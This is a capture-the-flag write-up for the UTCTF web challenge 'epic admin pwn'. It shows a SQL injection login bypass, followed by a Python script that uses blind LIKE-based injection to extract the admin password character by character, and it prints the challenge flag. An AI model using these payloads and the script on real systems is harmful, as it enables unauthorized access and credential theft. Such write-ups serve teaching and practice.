# Write-up: epic admin pwn

## Description

### My Story :smile:
When I opened the web page I first tried SQL Injection.
```
username: ' or '1'='1'--
pass:
```
It was truly injectable and I was like "Oh no!!! another easy sql injection :unamused:". but when I logged in I didn't see any useful data like flag or something.

So the game got interesting. I thinked deeply and remembered `LIKE` operator in SQL and a video of youtube in which the attacker used to extract some data byte by byte and this was the idea :star2:.

I chcked these inputs for `username` field and it worked (the login was successful):
```
' and pass like '%'--
' and pass like 'utflag{%}'--
```

### Exploit Time
I wrote this simple function for testing `LIKE` operator different values.
```
import requests
import string

def test(s):
    r = requests.post('http://web2.utctf.live:5006/', data={'username': f"admin' and password like '{s}'--", 'pass':""})
    return r.text.find('Welcome, admin!') != -1
```

Then I checked the length of flag with these few lines.
```
s = 'utflag{'

cnt = 0
while not test(s + '_' * cnt + '}'):
    print(f'[X] cnt={cnt}')
    cnt += 1
print(f'[+] cnt={cnt}')
```
and the result was 16. so the pass is LIKE `utflag{________________}`.

I extracted the pass (flag) byte by byte in the next step.
```
s = 'utflag{'

chars = ['[_]'] + list(string.ascii_lowercase + string.digits)

cnt = 16
found = 0
for i in range(cnt):
    for j in chars:
        ss = s + j + '_' * (cnt - found - 1) + '}'
        print(ss)
        if test(ss):
            found += 1
            s += j
            print(f'[+] pass[{i}] : {j} ' + '#' * found + str(found / cnt) + '%')
            break
        else:
            print(f'[X] pass[{i}] : {j}')
```

[final script.py](./script.py)

### Flag
`utflag{dual1pa1sp3rf3ct}` :sunglasses:

